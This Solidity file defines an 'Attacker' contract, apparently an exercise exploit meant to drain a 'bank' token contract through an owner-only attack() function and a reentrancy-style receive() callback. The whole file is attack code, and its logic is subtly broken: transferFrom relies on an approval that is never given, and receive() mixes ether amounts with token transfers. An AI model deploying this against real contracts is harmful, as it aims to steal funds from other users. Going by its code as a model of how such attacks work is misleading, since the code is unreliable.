// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ERC20Token {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}


contract Attacker is Ownable {
    ERC20Token public immutable bankContract;

    constructor(address bankContractAddress) {
        bankContract = ERC20Token(bankContractAddress);
    }

    function attack(address erc20Contract, uint256 amount) external onlyOwner {
    ERC20Token tokenContract = ERC20Token(erc20Contract);
    
    // Transfer tokens from the attacker contract to the bank contract
    tokenContract.transfer(address(bankContract), amount);
    
    // Transfer tokens back from the bank contract to the attacker contract
    tokenContract.transferFrom(address(bankContract), address(this), amount);
}


    
    receive() external payable {
		if (address(bankContract).balance > 0) {
			bankContract.transfer(address(this), msg.value);
		} else {
			payable(owner()).transfer(address(this).balance);
		}
	}
}
